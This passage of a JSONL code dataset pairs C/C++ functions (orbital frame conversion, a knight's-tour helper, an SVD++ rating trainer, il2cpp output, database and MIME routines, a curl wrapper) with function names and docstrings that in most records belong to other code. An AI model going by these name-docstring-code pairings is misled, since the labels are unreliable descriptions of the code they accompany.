Serial.println(\"\");\\n    Serial.println(\"Connection failed.\");\\n  }\\n  \\n  return state;\\n}'}","id":2784}
{"content":"{'function_name': 'Inertia2LVLH', 'docstring': '\/\/\u8f68\u9053\u9762\u6cd5\u5411\u5355\u4f4d\u77e2\u91cf', 'code': 'void LVLH2Inertia(int& flag, double* RV1, const double* RV0, const double* rv, double epsilon)\\n{\\n\\tint i;\\n\\t\\n\\tdouble R0[3]={RV0[0], RV0[1], RV0[2]};\\n\\tdouble V0[3]={RV0[3], RV0[4], RV0[5]};\\n\\tdouble r[3]={rv[0], rv[1], rv[2]};\\n\\tdouble v[3]={rv[3], rv[4], rv[5]};\\n\\tdouble radius=V_Norm2(R0, 3);\/\/\u8ddd\u79bb\\n\\tif(radius<=0.0){flag=0;return;}\\n\\tdouble UnitR[3];\\n\\tfor(i=0;i<3;i++) UnitR[i]=R0[i]\/radius;\/\/\u5f84\u5411\u5355\u4f4d\u77e2\u91cf    \\n\\tdouble VectorH[3];\\n\\tV_Cross(VectorH, R0, V0);\\n\\tdouble h=V_Norm2(VectorH,3);\/\/\u89d2\u52a8\u91cf\u503c\\n\\tif(h<=0.0){flag=0;return;}\\n\\tdouble UnitH[3];\\n\\tfor(i=0;i<3;i++) UnitH[i]=VectorH[i]\/h;\/\/\u8f68\u9053\u9762\u6cd5\u5411\u5355\u4f4d\u77e2\u91cf\\n\\t\\n\\tdouble omega[3];\\n\\tfor(i=0;i<3;i++) omega[i]=VectorH[i]\/(radius*radius);\\n\\tdouble UnitF[3];\\n\\tV_Cross(UnitF, UnitH, UnitR);\\n\\tdouble R1[3];\\n\\tfor(i=0;i<3;i++) R1[i]=R0[i]+r[0]*UnitR[i]+r[1]*UnitF[i]+r[2]*UnitH[i];\\n\\tdouble R_V[3];\\n\\tfor(i=0;i<3;i++) R_V[i]=R1[i]-R0[i];\\n\\tdouble tempv[3];\\n\\tV_Cross(tempv, omega, R_V);\\n\\tfor(i=0;i<3;i++)\\n\\t{\\n\\t\\tRV1[i]=R1[i];\\n\\t\\tRV1[3+i]=V0[i]+tempv[i]+v[0]*UnitR[i]+v[1]*UnitF[i]+v[2]*UnitH[i];\\n\\t}\\n\\tflag=1;\\n\\treturn;\\n}'}","id":2794}
{"content":"{'function_name': 'next_location_Generator', 'docstring': '\/\/8th posssible location (i-2,j -1)', 'code': 'int  number_of_next_location_Generator(knightLocation presentLocation)\\n{\\n    \/\/struct knightLocation nextLocation[8];\\n    n=0;\\n    \\n    \/\/1st possible location (i - 2,j + 1)\\n    nextnextLocation[0].xa = presentLocation.xa - 2;\\n    nextnextLocation[0].ya = presentLocation.ya+ 1;\\n    if (nextnextLocation[0].xa >= 0 && nextnextLocation[0].ya >= 0 && nextnextLocation[0].xa <= 7 && nextnextLocation[0].ya <= 7 && chessBoard[nextnextLocation[0].xa][nextnextLocation[0].ya]==-1)\\n    {\\n        n=n+1;\\n    }\\n    \\n    \/\/2nd posssible location (i-1,j +2)\\n    nextnextLocation[1].xa = presentLocation.xa - 1;\\n    nextnextLocation[1].ya = presentLocation.ya+ 2;\\n    if (nextnextLocation[1].xa >= 0 && nextnextLocation[1].ya >= 0 && nextnextLocation[1].xa <= 7 && nextnextLocation[1].ya <= 7 && chessBoard[nextnextLocation[1].xa][nextnextLocation[1].ya]==-1)\\n    {\\n        n=n+1;\\n    }\\n    \\n    \/\/3rd posssible location (i+1,j +2)\\n    nextnextLocation[2].xa = presentLocation.xa + 1;\\n    nextnextLocation[2].ya = presentLocation.ya + 2;\\n    if (nextnextLocation[2].xa >= 0 && nextnextLocation[2].ya >= 0 && nextnextLocation[2].xa <= 7 && nextnextLocation[2].ya <= 7 && chessBoard[nextnextLocation[2].xa][nextnextLocation[2].ya]==-1)\\n    {\\n        n=n+1;\\n    }\\n    \\n    \/\/4th posssible location (i+2,j +1)\\n    nextnextLocation[3].xa = presentLocation.xa + 2;\\n    nextnextLocation[3].ya = presentLocation.ya + 1;\\n    if (nextnextLocation[3].xa >= 0 && nextnextLocation[3].ya >= 0 && nextnextLocation[3].xa <= 7 && nextnextLocation[3].ya <= 7 && chessBoard[nextnextLocation[3].xa][nextnextLocation[3].ya]==-1)\\n    {\\n        n=n+1;\\n    }\\n    \/\/5th posssible location (i+2,j -1)\\n    nextnextLocation[4].xa = presentLocation.xa + 2;\\n    nextnextLocation[4].ya = presentLocation.ya - 1;\\n    if (nextnextLocation[4].xa >= 0 && nextnextLocation[4].ya >= 0 && nextnextLocation[4].xa <= 7 && nextnextLocation[4].ya <= 7 && chessBoard[nextnextLocation[4].xa][nextnextLocation[4].ya]==-1)\\n    {\\n        n=n+1;\\n    }\\n    \/\/6th posssible location (i+1,j -2)\\n    nextnextLocation[5].xa = presentLocation.xa + 1;\\n    nextnextLocation[5].ya = presentLocation.ya- 2;\\n    if (nextnextLocation[5].xa >= 0 && nextnextLocation[5].ya >= 0 && nextnextLocation[5].xa <= 7 && nextnextLocation[5].ya <= 7 && chessBoard[nextnextLocation[5].xa][nextnextLocation[5].ya]==-1)\\n    {\\n        n=n+1;\\n    }\\n    \\n    \/\/7th posssible location (i-1,j -2)\\n    nextnextLocation[6].xa = presentLocation.xa- 1;\\n    nextnextLocation[6].ya = presentLocation.ya- 2;\\n    if (nextnextLocation[6].xa >= 0 && nextnextLocation[6].ya >= 0 && nextnextLocation[6].xa <= 7 && nextnextLocation[6].ya <= 7 && chessBoard[nextnextLocation[6].xa][nextnextLocation[6].ya]==-1)\\n    {\\n        n=n+1;\\n    }\\n    \\n    \/\/8th posssible location (i-2,j -1)\\n    nextnextLocation[7].xa = presentLocation.xa- 2;\\n    nextnextLocation[7].ya = presentLocation.ya - 1;\\n    if (nextnextLocation[7].xa >= 0 && nextnextLocation[7].ya >= 0 && nextnextLocation[7].xa <= 7 && nextnextLocation[7].ya <= 7 &&chessBoard[nextnextLocation[7].xa][nextnextLocation[7].ya]==-1)\\n    {\\n        n=n+1;\\n    }\\n    \\n    return n;\\n}'}","id":2797}
{"content":"{'function_name': 'checkpoint_U_V', 'docstring': '\/\/ Write U and V to a file', 'code': 'svd_ans train_model_from_UV(double eta, double reg,\\n                            int* user_matrix, short* movie_matrix,\\n                            short* date_matrix, double* rating_matrix,\\n                            int* user_matrix_val, short* movie_matrix_val,\\n                            short* date_matrix_val, double* rating_matrix_val,\\n                            double** U, double** V, double** y, double** SumMW,\\n                            int* user_matrix_test, short* movie_matrix_test,\\n                            short* date_matrix_test, double* bu, double* bi) {\\n    \/*\\n    Given a training data Y_ij is user i\\'s rating on movie j, learns an\\n    USER_SIZE x LATENT_FACTORS matrix U and MOVIE_SIZE x LATENT_FACTORS matrix V such that rating Y_ij is approximated\\n    by (UV)_ij.\\n\\n    y is the second set of latent factors, MOVIE_SIZE by LATENT_FACTORS\\n\\n    Uses an initial learning rate of <eta> and regularization of <reg>. Stops\\n    after <MAX_EPOCH> epochs, or MSE of validation set stops decreasing.\\n    Learning rate decreases by 10% every epoch.\\n\\n    Returns a tuple (U, V, err) consisting of U, V, and the unregularized MSE\\n    of the model.\\n    *\/\\n\\n    double E_in = 100, E_val = 100;\\n    double init_E_in = 100, init_E_val = 100;\\n\\n\\n\\n\\n    \/\/ Initialize timers\\n    system_clock::time_point start_time, end_time;\\n\\n    \/\/ Stochastic gradient descent\\n    for (int epoch = 0; epoch < MAX_EPOCH; epoch++) {\\n\\n        cout << \"Epoch \" << epoch << \":\" << endl;\\n        start_time = system_clock::now();\\n\\n        \/\/ print predictions every 10 epochs\\n\\t\\t\/\/ if (epoch % 10 == 0 ) {\\n        \/\/     predict( U, V, SumMW, bu, bi,user_matrix_test, movie_matrix_test, date_matrix_test);\\n        \/\/\\n\\t\\t\/\/ }\\n\\n\\t\\t\/\/ Loop through the users, i is the user id - 1\\n        for (long i = 0; i < USER_SIZE; i++) {\\n\\n            \/\/ Progress bar\\n            if (i % 1000 == 0) {\\n                end_time = system_clock::now();\\n                auto duration = duration_cast<seconds>( end_time - start_time ).count();\\n                cout << \"\\\\r\" << to_string(i * 100 \/ USER_SIZE) << \"%%\"\\n                     << \"  Time: \" << duration \/ 60 << \"m\" << duration % 60 << \"s\" << flush;\\n            }\\n\\n            \/\/ Update U[i], V[j]\\n            double sqrt_r = 0.0;\\n\\t\\t\\t\/\/ calculate R(u) ^ -1\/2\\n\\t\\t\\tint sz = (movies_rated_by_user[i]).size();\\n\\t\\t\\t\/\/ Want to make sure it is not 0 before we divide and take the square root\\n\\t\\t\\tif (sz > 0)\\n\\t\\t\\t{\\n\\t\\t\\t\\tsqrt_r = 1 \/ sqrt(sz);\\n\\t\\t\\t}\\n\\n\\t\\t\\t\/\/ tmpSum is used to update the y factors for movies the user rated\\n            \/\/ It\\'s the same for one user\\n\\t\\t\\tvector <double> tmpSum(LATENT_FACTORS, 0);\\n\\n            \/\/ SumMW stores the sum of y factors for the movies rated by each user\\n            \/\/ This is only updated for one user in this loop\\n\\t\\t\\tfor (int k = 0; k < LATENT_FACTORS; k++) {\\n\\t\\t\\t\\tdouble sumy = 0;\\n                \/\/ Loop through the t^th movie rated by this user\\n\\t\\t\\t\\tfor (int t = 0; t < sz; t++) {\\n\\t\\t\\t\\t\\tsumy += y[ movies_rated_by_user[i][t] ] [k];\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\tSumMW[i][k] = sumy;\\n\\t\\t\\t}\\n\\n\\t\\t\\t\/\/ Update the U and V matricies using the gradient\\n            \/\/ Loop through all the movies rated by a user\\n\\t\\t\\tfor (int t = 0; t < sz; t++)\\n\\t\\t\\t{\\n\\t\\t\\t\\tdouble Yij = ratings_by_user[i][t]; \/\/ the actual rating\\n\\t\\t\\t\\tint j = movies_rated_by_user[i][t]; \/\/ the movie index\\n\\n\\t\\t\\t\\t\/\/ get the predicted score\\n                double score = predict_score(U, V, SumMW, i, j, bu[i], bi[j], sqrt_r);\\n                double error = Yij - score;\\n\\n                \/\/ Update U for user i and V for movie j\\n                for(int k = 0; k < LATENT_FACTORS; k++){\\n                    double uf = U[i][k]; \/\/ The U latent factor for this user i\\n                    double mf = V[j][k]; \/\/ The V latent factor for this movie j\\n                    U[i][k] += LEARNING_RATE * (error * mf - REGULARIZATION * uf);\\n                    V[j][k] += LEARNING_RATE * (error * (uf + sqrt_r*SumMW[i][k]) - reg * mf);\\n                    tmpSum[k] += error * sqrt_r * mf;\\n                    bi[j] += LEARNING_RATE_BIAS * (error - REGULARIZATION * bi[j]);\\n                    bu[i] += LEARNING_RATE_BIAS * (error - REGULARIZATION * bu[i]);\\n                }\\n\\t\\t\\t}\\n\\n\\t\\t\\t\/\/ Update the y factors for each movie a user rated\\n\\t\\t\\tfor (int t = 0; t < sz; t++)\\n\\t\\t\\t{\\n\\t\\t\\t\\tint j = movies_rated_by_user[i][t];\\n                for (int k = 0; k < LATENT_FACTORS; ++k) {\\n                    y[j][k] += LEARNING_RATE_Y * (tmpSum[k] - REGULARIZATION_Y * y[j][k]);\\n                }\\n\\t\\t\\t}\\n        }\\n\\n        \/\/ Update SumMW for all users\\n        for (int i = 0; i < USER_SIZE; i++)\\n        {\\n\\t\\t\\tint sz = (movies_rated_by_user[i]).size();\\n\\t\\t\\tfor (int k = 0; k < LATENT_FACTORS; k++)\\n\\t\\t\\t{\\n\\t\\t\\t\\tdouble sumy = 0;\\n\\t\\t\\t\\t\/\/ get the sum for all the movies rated by the user the\\n\\t\\t\\t\\t\/\/ latent factors associated with the movie rated by the user\\n\\t\\t\\t\\tfor (int t = 0; t < sz; t++)\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tsumy += y[ movies_rated_by_user[i][t] ] [k];\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\tSumMW[i][k] = sumy;\\n\\t\\t\\t}\\n\\t\\t}\\n\\n        \/\/ At end of epoch, print E_in, E_val\\n        \/\/ srand ( unsigned ( time(0) ) );\\n        \/\/ long rand_n = rand() % (TRAIN_SIZE-1000001);\\n        \/\/ E_in = get_err(U, V, user_matrix+rand_n, movie_matrix+rand_n,\\n        \/\/                     date_matrix+rand_n, rating_matrix+rand_n,\\n        \/\/                     1000000, reg, SumMW,bu,bi);\\n        E_val = get_err(U, V, user_matrix_val, movie_matrix_val,\\n                              date_matrix_val, rating_matrix_val,\\n                              VALID_SIZE, reg,SumMW, bu, bi);\\n\\n        cout << endl << \"E_in: \" << E_in << \"  E_val: \" << E_val << endl;\\n\\n\\n        \/\/ If E_val doesn\\'t decrease, stop early\\n        if (init_E_val <= E_val) {\\n            cout<<\"E_val is increasing!\"<<endl;\\n            \/\/ checkpoint_U_V(U, V, epoch);\\n            break;\\n        }\\n        init_E_val = E_val;\\n        eta *= (0.9 + 0.1 * rand() \/ RAND_MAX);\\n    }\\n    cout << endl;\\n\\n    svd_ans result = {U, V, E_in, E_val};\\n    return result;\\n}'}","id":2802}
{"content":"{'function_name': 'main', 'docstring': '\/\/ End of the temporal loop', 'code': 'int main(int argc, char **argv)\\n{\\n    \/\/convergence_test(); \/\/ GUILLAUME APPLICATION\\n    \/\/convergence_test_normal_error(); \/\/ STEFANO APPLICATION: STATIC BUBBLE ANALYTIC\\n    convergence_test_normal_error_numerical_ls(); \/\/ STEFANO APPLICATION: STATIC BUBBLE NUMERICAL\\n    \/\/ tests_stabilization();\\n    \/\/ interface_residus();\\n    return 1;\\n}'}","id":2803}
{"content":"{'function_name': 'Java_nimbus_nativestructs_CSet_c_1iterHasNext', 'docstring': '\/\/ check whether or not we have created an iterator for this map before', 'code': 'JNIEXPORT jstring JNICALL Java_nimbus_nativestructs_CSet_c_1iterNext(JNIEnv* env, jobject, jint si, jint index)\\n{\\n\\tsettype* set = csetSetFactory.Get(si);\\n\\t\/\/ check whether or not we have created an iterator for this map before\\n\\tSetToItersMapConstIter iter = setToIterMap.find(si);\\n\\tif (iter != setToIterMap.end())\\n\\t{\\n\\t\\t\/\/ if we have, then we will want to add a new set const iter with a new index\\n\\t\\tIndexedToIterMapConstIter indexIter = iter->second->find(index);\\n\\n\\t\\tsetconstiter* setIter = indexIter->second;\\n\\t\\tif (*setIter != set->end()) {\\n\\t\\t\\tjstring retval = JNIUtils::strToJString(env, *(*setIter));\\n\\t\\t\\t(*setIter)++;\\n\\t\\t\\treturn retval;\\n\\t\\t}\\n\\t}\\n\\n\\treturn 0;\\n}'}","id":2805}
{"content":"{'function_name': 'DBISetHeaderAfterAttach', 'docstring': '\/\/pdbfilehdr->le_ulDaeUpdateMajor = ulDAEUpdateMajorMax;', 'code': \"INLINE ERR ErrDBDeleteUnicodeIndexes( PIB *ppib, const IFMP ifmp )\\n{\\n    ERR         err = JET_errSuccess;\\n    IFMP        ifmpT = 0;\\n    BOOL        fReadOnly = fFalse;\\n    BOOL        fIndexesUpdated = fFalse;\\n    BOOL        fIndexesDeleted = fFalse;\\n\\n    Call( ErrDBOpenDatabase( ppib, g_rgfmp[ifmp].WszDatabaseName(), &ifmpT, NO_GRBIT ) );\\n    fReadOnly = ( JET_wrnFileOpenReadOnly == err );\\n    Assert( ifmp == ifmpT );\\n\\n\\n    if ( !fReadOnly )\\n    {\\n        err = ErrCATDeleteOrUpdateOutOfDateLocalizedIndexes(\\n                    ppib,\\n                    ifmpT,\\n                    catcifDeleteOutOfDateSecondaryIndices | catcifUpdateEmptyIndices | catcifForceDeleteIndices,\\n                    &fIndexesUpdated,\\n                    &fIndexesDeleted );\\n\\n        if ( fIndexesDeleted )\\n        {\\n            \/\/  signal version cleanup to reclaim space from\\n            \/\/  the deleted indices (in case the user recreates\\n            \/\/  the indices, the hope is that space requests\\n            \/\/  will be serviced by space released from the\\n            \/\/  deleted indices)\\n            \/\/\\n            VERSignalCleanup( ppib );\\n        }\\n    }\\n\\n    CallS( ErrDBCloseDatabase( ppib, ifmpT, 0 ) );\\n    Call( err );\\n\\n    \/\/  to ensure we don't do this again, we'll ask to fixup the table...\\n\\n    Call( ErrCATVerifyMSLocales( ppib, ifmp, fTrue \/* fixup table *\/ ) );\\n    \\n    return err;\\n\\nHandleError:\\n\\n    return err;\\n}\"}","id":2806}
{"content":"{'function_name': 'Dictionary_2_Do_ICollectionCopyTo_TisIl2CppObject_m4050345195_gshared', 'docstring': '\/\/ end catch (depth: 1)', 'code': 'void Dictionary_2_Do_ICollectionCopyTo_TisBoolean_t3143194569_m671015067_gshared (Dictionary_2_t1527285693 * __this, Il2CppArray * ___array, int32_t ___index, Transform_1_t331251960 * ___transform, const MethodInfo* method)\\n{\\n\\tstatic bool s_Il2CppMethodIntialized;\\n\\tif (!s_Il2CppMethodIntialized)\\n\\t{\\n\\t\\til2cpp_codegen_initialize_method (Dictionary_2_Do_ICollectionCopyTo_TisBoolean_t3143194569_m671015067_MetadataUsageId);\\n\\t\\ts_Il2CppMethodIntialized = true;\\n\\t}\\n\\tType_t * V_0 = NULL;\\n\\tType_t * V_1 = NULL;\\n\\tException_t1145979430 * V_2 = NULL;\\n\\tException_t1145979430 * __last_unhandled_exception = 0;\\n\\tNO_UNUSED_WARNING (__last_unhandled_exception);\\n\\tException_t1145979430 * __exception_local = 0;\\n\\tNO_UNUSED_WARNING (__exception_local);\\n\\tint32_t __leave_target = 0;\\n\\tNO_UNUSED_WARNING (__leave_target);\\n\\t{\\n\\t\\tIL2CPP_RUNTIME_CLASS_INIT(Type_t_il2cpp_TypeInfo_var);\\n\\t\\tType_t * L_0 = Type_GetTypeFromHandle_m432505302(NULL \/*static, unused*\/, (RuntimeTypeHandle_t2078935215 )LoadTypeToken(IL2CPP_RGCTX_TYPE(method->rgctx_data, 0)), \/*hidden argument*\/NULL);\\n\\t\\tV_0 = (Type_t *)L_0;\\n\\t\\tIl2CppArray * L_1 = ___array;\\n\\t\\tNullCheck((Il2CppObject *)L_1);\\n\\t\\tType_t * L_2 = Object_GetType_m191970594((Il2CppObject *)L_1, \/*hidden argument*\/NULL);\\n\\t\\tNullCheck((Type_t *)L_2);\\n\\t\\tType_t * L_3 = VirtFuncInvoker0< Type_t * >::Invoke(43 \/* System.Type System.Type::GetElementType() *\/, (Type_t *)L_2);\\n\\t\\tV_1 = (Type_t *)L_3;\\n\\t}\\n\\nIL_0017:\\n\\ttry\\n\\t{ \/\/ begin try (depth: 1)\\n\\t\\t{\\n\\t\\t\\tType_t * L_4 = V_0;\\n\\t\\t\\tNullCheck((Type_t *)L_4);\\n\\t\\t\\tbool L_5 = VirtFuncInvoker0< bool >::Invoke(30 \/* System.Boolean System.Type::get_IsPrimitive() *\/, (Type_t *)L_4);\\n\\t\\t\\tif (L_5)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_002d;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_0022:\\n\\t\\t{\\n\\t\\t\\tType_t * L_6 = V_1;\\n\\t\\t\\tNullCheck((Type_t *)L_6);\\n\\t\\t\\tbool L_7 = VirtFuncInvoker0< bool >::Invoke(30 \/* System.Boolean System.Type::get_IsPrimitive() *\/, (Type_t *)L_6);\\n\\t\\t\\tif (!L_7)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_003f;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_002d:\\n\\t\\t{\\n\\t\\t\\tType_t * L_8 = V_1;\\n\\t\\t\\tType_t * L_9 = V_0;\\n\\t\\t\\tNullCheck((Type_t *)L_8);\\n\\t\\t\\tbool L_10 = VirtFuncInvoker1< bool, Type_t * >::Invoke(40 \/* System.Boolean System.Type::IsAssignableFrom(System.Type) *\/, (Type_t *)L_8, (Type_t *)L_9);\\n\\t\\t\\tif (L_10)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_003f;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_0039:\\n\\t\\t{\\n\\t\\t\\tException_t1145979430 * L_11 = (Exception_t1145979430 *)il2cpp_codegen_object_new(Exception_t1145979430_il2cpp_TypeInfo_var);\\n\\t\\t\\tException__ctor_m3886110570(L_11, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_11);\\n\\t\\t}\\n\\nIL_003f:\\n\\t\\t{\\n\\t\\t\\tIl2CppArray * L_12 = ___array;\\n\\t\\t\\tint32_t L_13 = ___index;\\n\\t\\t\\tTransform_1_t331251960 * L_14 = ___transform;\\n\\t\\t\\tNullCheck((Dictionary_2_t1527285693 *)__this);\\n\\t\\t\\t((  void (*) (Dictionary_2_t1527285693 *, ObjectU5BU5D_t3632007997*, int32_t, Transform_1_t331251960 *, const MethodInfo*))IL2CPP_RGCTX_METHOD_INFO(method->rgctx_data, 1)->method)((Dictionary_2_t1527285693 *)__this, (ObjectU5BU5D_t3632007997*)((ObjectU5BU5D_t3632007997*)Castclass(L_12, ObjectU5BU5D_t3632007997_il2cpp_TypeInfo_var)), (int32_t)L_13, (Transform_1_t331251960 *)L_14, \/*hidden argument*\/IL2CPP_RGCTX_METHOD_INFO(method->rgctx_data, 1));\\n\\t\\t\\tgoto IL_0069;\\n\\t\\t}\\n\\t} \/\/ end try (depth: 1)\\n\\tcatch(Il2CppExceptionWrapper& e)\\n\\t{\\n\\t\\t__exception_local = (Exception_t1145979430 *)e.ex;\\n\\t\\tif(il2cpp_codegen_class_is_assignable_from (Exception_t1145979430_il2cpp_TypeInfo_var, e.ex->object.klass))\\n\\t\\t\\tgoto CATCH_0052;\\n\\t\\tthrow e;\\n\\t}\\n\\nCATCH_0052:\\n\\t{ \/\/ begin catch(System.Exception)\\n\\t\\t{\\n\\t\\t\\tV_2 = (Exception_t1145979430 *)((Exception_t1145979430 *)__exception_local);\\n\\t\\t\\tException_t1145979430 * L_15 = V_2;\\n\\t\\t\\tArgumentException_t2320721629 * L_16 = (ArgumentException_t2320721629 *)il2cpp_codegen_object_new(ArgumentException_t2320721629_il2cpp_TypeInfo_var);\\n\\t\\t\\tArgumentException__ctor_m3312963299(L_16, (String_t*)_stringLiteral3845490374, (String_t*)_stringLiteral1185213181, (Exception_t1145979430 *)L_15, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_16);\\n\\t\\t}\\n\\nIL_0064:\\n\\t\\t{\\n\\t\\t\\tgoto IL_0069;\\n\\t\\t}\\n\\t} \/\/ end catch (depth: 1)\\n\\nIL_0069:\\n\\t{\\n\\t\\treturn;\\n\\t}\\n}'}","id":2811}
{"content":"{'function_name': 'curl_WriteMemoryCallback', 'docstring': '\/\/ +1;', 'code': 'static int CURL_Init(int r7Sn, int functionSn) {\\r\\n\\t\\t\/\/CURL_t *curl = (CURL_t *)calloc(1, sizeof(CURL_t));\\r\\n\\t\\t\/\/R7_GetVariableObject(r7Sn, functionSn, 2, curl);\\r\\n\\r\\n\\t\\tint result = 1;\\r\\n\\t\\tvoid *variableObject = NULL;\\r\\n\\t\\tresult = R7_InitVariableObject(r7Sn, functionSn, 2, sizeof(CURL_t));\\r\\n\\t\\tif (result <= 0) {\\r\\n\\t\\t\\tR7_SetVariableInt(r7Sn, functionSn, 1, -1);\\r\\n\\t\\t\\treturn -1;\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tresult = R7_GetVariableObject(r7Sn, functionSn, 2, &variableObject);\\r\\n\\t\\tif (result <= 0) {\\r\\n\\t\\t\\tR7_SetVariableInt(r7Sn, functionSn, 1, -1);\\r\\n\\t\\t\\treturn -1;\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tCURL_t *curl = ((CURL_t*)variableObject);\\r\\n\\r\\n\\r\\n\\t\\tcurl->chunk.memory = (char*)malloc(R7_PAGE_SIZE);\/\/ will be grown as needed by realloc above\\r\\n\\t\\tif (curl->chunk.memory == NULL) {\\r\\n\\t\\t\\tR7_SetVariableInt(r7Sn, functionSn, 1, -1);\\r\\n\\t\\t\\treturn -1;\\r\\n\\t\\t}\\r\\n\\t\\tcurl->chunk.size = R7_PAGE_SIZE;\\r\\n\\t\\tcurl->chunk.length = 0;\\r\\n\\r\\n\\t\\tcurl->curl = curl_easy_init();\\r\\n\\t\\tif (curl == NULL) {\\n\\t\\t\\tR7_SetVariableInt(r7Sn, functionSn, 1, -1);\\n\\t\\t\\treturn -1;\\n\\t\\t}\\r\\n\\r\\n\\t\\tR7_SetVariableInt(r7Sn, functionSn, 1, result);\\r\\n\\t\\tR7_SetVariableObject(r7Sn, functionSn, 2, curl);\\r\\n\\t\\treturn 1;\\r\\n\\t}'}","id":2815}
{"content":"{'function_name': 'setup', 'docstring': '\/\/FastLED.addLeds<NEOPIXEL, DATA_PIN>(leds, NUM_LEDS);', 'code': 'int getLetterPos(char letter){\\n\\tint l_pos = 26; \/\/ \" \" by default\\n\\n\\tfor(int i = 0; i < LETTERS_LEN; i++){\\n\\t\\tif(letter == LETTERS_KEY[i]){\\n\\t\\t\\tl_pos = i;\\n\\t\\t}\\n\\t}\\n\\treturn l_pos;\\n}'}","id":2835}
{"content":"{'function_name': 'MimeOleSetBodyPropW', 'docstring': '\/\/ Call Method\\r', 'code': 'MIMEOLEAPI MimeOleQueryString(\\r\\n        LPCSTR              pszSearchMe,\\r\\n        LPCSTR              pszCriteria,\\r\\n        boolean             fSubString,\\r\\n        boolean             fCaseSensitive)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT     hr=S_OK;\\r\\n    LPSTR       pszDataLower=NULL;\\r\\n\\r\\n    \/\/ Invalid Arg\\r\\n    Assert(pszSearchMe && pszCriteria);\\r\\n\\r\\n    \/\/ Init\\r\\n    STACKSTRING_DEFINE(rDataLower, 255);\\r\\n\\r\\n    \/\/ No SubString Search\\r\\n    if (FALSE == fSubString)\\r\\n    {\\r\\n        \/\/ Case Sensitive\\r\\n        if (fCaseSensitive)\\r\\n        {\\r\\n            \/\/ Equal\\r\\n            if (lstrcmp(pszSearchMe, pszCriteria) == 0)\\r\\n                goto exit;\\r\\n        }\\r\\n\\r\\n        \/\/ Otherwise, Not Case Sensitive\\r\\n        else if (lstrcmpi(pszSearchMe, pszCriteria) == 0)\\r\\n            goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Otheriwse, comparing substring\\r\\n    else\\r\\n    {\\r\\n        \/\/ Case Sensitive\\r\\n        if (fCaseSensitive)\\r\\n        {\\r\\n            \/\/ Equal\\r\\n            if (StrStr(pszSearchMe, pszCriteria) != NULL)\\r\\n                goto exit;\\r\\n        }\\r\\n\\r\\n        \/\/ Otherwise, Not Case Sensitive\\r\\n        else\\r\\n        {\\r\\n            \/\/ Get the Length\\r\\n            ULONG cchSearchMe = lstrlen(pszSearchMe);\\r\\n\\r\\n            \/\/ Set size the stack string\\r\\n            STACKSTRING_SETSIZE(rDataLower, cchSearchMe + 1);\\r\\n\\r\\n            \/\/ Copy the data\\r\\n            CopyMemory(rDataLower.pszVal, pszSearchMe, cchSearchMe + 1);\\r\\n\\r\\n            \/\/ Lower Case Compare\\r\\n            CharLower(rDataLower.pszVal);\\r\\n\\r\\n            \/\/ Compare Strings...\\r\\n            if (StrStr(rDataLower.pszVal, pszCriteria) != NULL)\\r\\n                goto exit;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    \/\/ No Match\\r\\n    hr = S_FALSE;\\r\\n\\r\\nexit:\\r\\n    \/\/ Cleanup\\r\\n    STACKSTRING_FREE(rDataLower);\\r\\n\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":2854}
{"content":"{'function_name': 'ErrDBOpenDatabase', 'docstring': '\/\/  Allow others to open.', 'code': 'ERR ISAMAPI ErrIsamCloseDatabase( JET_SESID sesid, JET_DBID ifmp, JET_GRBIT grbit )\\n{\\n    ERR     err;\\n    PIB     *ppib = (PIB *)sesid;\\n\\n    \/\/  check parameters\\n    \/\/\\n    Assert( sizeof(JET_SESID) == sizeof(PIB *) );\\n    CallR( ErrPIBCheck( ppib ) );\\n\\n    CallR( ErrDBCheckUserDbid( ifmp ) );\\n\\n    CallR ( ErrDBCloseDatabase( ppib, ifmp, grbit ) );\\n\\n    Assert( !BoolParam( PinstFromPpib( ppib ), JET_paramOneDatabasePerSession ) || !FSomeDatabaseOpen( ppib, ifmp ) );\\n\\n    return JET_errSuccess;\\n}'}","id":2865}
{"content":"{'function_name': 'create_table_lch', 'docstring': '\/\/\u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u043d\u043e\u043c\u0435\u0440\u0430 \u043a\u0430\u043d\u0430\u043b\u0430', 'code': 'static INT start_ltr114\\n    (\\n    PTLTR114 hnd,\\n    int frame\\n    )\\n    {\\n    \/*\\n     * \u0417\u0430\u043f\u0443\u0441\u043a \u0441\u0431\u043e\u0440\u0430 \u0434\u0430\u043d\u043d\u044b\u0445 \u043c\u043e\u0434\u0443\u043b\u0435\u043c LTR114.\\n     * \u041e\u041f\u0418\u0421\u0410\u041d\u0418\u0415\\n     *   \u0412\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u0442\u0441\u044f \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0430 \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u0437\u0430\u043f\u0443\u0441\u043a\u0430 \u043f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u044f \u0432 \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u043c \u0440\u0435\u0436\u0438\u043c\u0435 \u0438 \u043e\u0436\u0438\u0434\u0430\u0435\u0442\u0441\u044f (\u0441\\n     *   \u0442\u0430\u0439\u043c-\u0430\u0443\u0442\u043e\u043c) \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u0435 \u043a\u043e\u043c\u0430\u043d\u0434\u044b.\\n     * \u041f\u0410\u0420\u0410\u041c\u0415\u0422\u0420\u042b\\n     *   hnd   - 